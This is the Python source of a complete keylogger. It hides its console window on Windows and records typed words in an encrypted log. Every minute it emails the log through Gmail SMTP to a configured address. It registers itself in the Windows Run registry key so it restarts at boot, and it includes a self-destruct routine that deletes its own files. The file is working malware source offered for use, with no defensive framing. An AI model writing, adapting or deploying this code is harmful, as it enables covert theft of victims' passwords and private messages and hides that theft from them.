import pynput
from pynput import keyboard
import json
import os
import sys
import ctypes
import smtplib
import time
from datetime import datetime
from cryptography.fernet import Fernet
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart

# ========== CONFIGURATIONS ==========
logs_file = "logs.enc"
key_file = "secret.key"
email_send_interval = 60  # Send logs every 60 seconds
self_destruct_trigger = False  # Set to True to enable self-destruct
startup_enabled = True  # Set to True to auto-run on startup

# Email settings (Replace with your credentials)
EMAIL_SENDER = "your_email@gmail.com"
EMAIL_PASSWORD = "your_email_password"
EMAIL_RECEIVER = "receiver_email@gmail.com"

# ========== STEALTH MODE ==========
if os.name == "nt":
    ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)

# ========== ENCRYPTION SETUP ==========
if not os.path.exists(key_file):
    key = Fernet.generate_key()
    with open(key_file, "wb") as file:
        file.write(key)
else:
    with open(key_file, "rb") as file:
        key = file.read()

cipher = Fernet(key)

# Load existing logs
if os.path.exists(logs_file):
    try:
        with open(logs_file, "rb") as file:
            encrypted_data = file.read()
            logs = json.loads(cipher.decrypt(encrypted_data).decode())
    except:
        logs = []
else:
    logs = []

word_buffer = ""  # Stores typed words

ignored_keys = {
    keyboard.Key.shift, keyboard.Key.shift_r, keyboard.Key.ctrl, keyboard.Key.ctrl_r,
    keyboard.Key.alt, keyboard.Key.alt_r, keyboard.Key.cmd, keyboard.Key.tab,
    keyboard.Key.backspace, keyboard.Key.delete, keyboard.Key.esc,
    keyboard.Key.up, keyboard.Key.down, keyboard.Key.left, keyboard.Key.right,
    keyboard.Key.caps_lock, keyboard.Key.num_lock, keyboard.Key.scroll_lock,
    keyboard.Key.insert, keyboard.Key.page_up, keyboard.Key.page_down,
    keyboard.Key.home, keyboard.Key.end, keyboard.Key.pause
}

# ========== FUNCTIONS ==========

def encrypt_and_save_logs():
    """Encrypt logs and store securely."""
    encrypted_data = cipher.encrypt(json.dumps(logs).encode())
    with open(logs_file, "wb") as file:
        file.write(encrypted_data)

def send_logs_email():
    """Sends logs via email at intervals."""
    global logs
    if logs:
        message = MIMEMultipart()
        message["From"] = EMAIL_SENDER
        message["To"] = EMAIL_RECEIVER
        message["Subject"] = "Keylogger Logs"

        body = "\n".join(logs)
        message.attach(MIMEText(body, "plain"))

        try:
            server = smtplib.SMTP("smtp.gmail.com", 587)
            server.starttls()
            server.login(EMAIL_SENDER, EMAIL_PASSWORD)
            server.sendmail(EMAIL_SENDER, EMAIL_RECEIVER, message.as_string())
            server.quit()
            logs = []  # Clear logs after sending
            encrypt_and_save_logs()
            print("[+] Logs sent via email!")
        except Exception as e:
            print(f"[-] Failed to send email: {e}")

def on_press(key):
    global word_buffer
    if key in ignored_keys:
        return

    try:
        key_pressed = key.char
    except AttributeError:
        key_pressed = str(key)

    if key_pressed in ['Key.space', 'Key.enter']:
        if word_buffer:
            timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            logs.append(f"[{timestamp}] {word_buffer}")
            word_buffer = ""
            encrypt_and_save_logs()
    else:
        word_buffer += key_pressed

def on_release(key):
    if key == keyboard.Key.esc:
        print("\n[+] Exiting Keylogger...")
        return False

# ========== SELF-DESTRUCT FUNCTION ==========
def self_destruct():
    """Deletes the script and logs after execution."""
    print("[!] Self-destruct triggered! Deleting files...")
    try:
        os.remove(logs_file)
        os.remove(key_file)
        os.remove(sys.argv[0])  # Deletes the script itself
    except Exception as e:
        print(f"[-] Self-destruct failed: {e}")

# ========== AUTO-RUN ON STARTUP ==========
def add_to_startup():
    """Registers the script to run on startup (Windows only)."""
    if os.name == "nt":
        script_path = os.path.abspath(sys.argv[0])
        reg_cmd = f'reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Keylogger /t REG_SZ /d "{script_path}" /f'
        os.system(reg_cmd)
        print("[+] Keylogger added to startup!")

# ========== MAIN EXECUTION ==========
if startup_enabled:
    add_to_startup()

if self_destruct_trigger:
    self_destruct()

# Start keylogger
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    # Start email sender in parallel
    while listener.running:
        time.sleep(email_send_interval)
        send_logs_email()
